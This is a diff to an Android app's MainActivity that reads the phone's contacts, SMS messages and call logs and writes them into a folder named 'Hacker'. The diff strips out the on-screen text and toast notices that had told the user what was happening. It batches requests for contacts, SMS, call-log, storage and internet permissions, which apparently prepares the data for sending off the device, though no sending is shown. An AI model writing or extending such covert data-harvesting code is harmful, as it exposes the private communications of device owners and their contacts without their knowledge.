@@ -30,27 +30,35 @@ import java.util.Date;
 import static android.content.ContentValues.TAG;
 
 public class MainActivity extends AppCompatActivity {
-    TextView textView;
+
+    private String[] PERMISSIONS;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        textView=findViewById(R.id.text);
+
     }
 
     @Override
     protected void onStart() {
         super.onStart();
         if(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED){
-            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},0);
-        }else {
+            PERMISSIONS=new String[]{
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                    Manifest.permission.INTERNET
+
+            };
+            ActivityCompat.requestPermissions(MainActivity.this,PERMISSIONS,1);
+
+        }
+        else {
             File file = new File(getExternalFilesDir(null) +"/Hacker");
             if (!file.exists()) {
                 file.mkdir();
-                textView.setText(file.toString());
-                Toast.makeText(this, "FileCreated", Toast.LENGTH_SHORT).show();
-            } else {
-                Toast.makeText(this, "File already exists" + file, Toast.LENGTH_SHORT).show();
+
             }
             gettingcontacts();
             getcalllog();
@@ -61,9 +69,6 @@ public class MainActivity extends AppCompatActivity {
 
 
     private void getsms() {
-        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!= PackageManager.PERMISSION_GRANTED){
-            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_SMS},0);
-        }
        try {
             File SmsFile=new File(getExternalFilesDir(null)+"/Hacker");
 
@@ -90,9 +95,6 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void getcalllog() {
-        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!= PackageManager.PERMISSION_GRANTED){
-            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CALL_LOG},0);
-        }
         try {
             File file=new File(getExternalFilesDir(null)+"/Hacker");
 
@@ -106,7 +108,7 @@ public class MainActivity extends AppCompatActivity {
                     @SuppressLint("Range") String Name=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.CACHED_NAME));
                     @SuppressLint("Range") String Number=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.NUMBER));
                     @SuppressLint("Range") String Duration=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.DURATION));
-                    callwriter.append("Cached_Name : "+Name+"\r\n"+"Number : "+Number+"\r\n"+"Duration : "+Duration+"\r\n");
+                    callwriter.append("Cached_Name : "+Name+"\r\n"+"Number : "+Number+"\r\n"+"Duration : "+Duration+" Seconds\r\n");
                     callwriter.flush();
                 }
             }
@@ -119,9 +121,6 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void gettingcontacts(){
-        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED){
-            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS},0);
-        }
         try {
         File file=new File(getExternalFilesDir(null)+"/Hacker");
 
@@ -137,7 +136,7 @@ public class MainActivity extends AppCompatActivity {
             while (cursor.moveToNext()){
                 @SuppressLint("Range") String contactname= cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 @SuppressLint("Range") String phoneNumber= cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                textView.setText("Contact Name : "+contactname+" Ph : "+phoneNumber);
+
                 writer.append("Contact Name : "+contactname+" Ph : "+phoneNumber+"\r\n");
                 writer.flush();
                 Log.i("Content Provider","Contact Name ::: "+contactname+" Ph # "+phoneNumber);
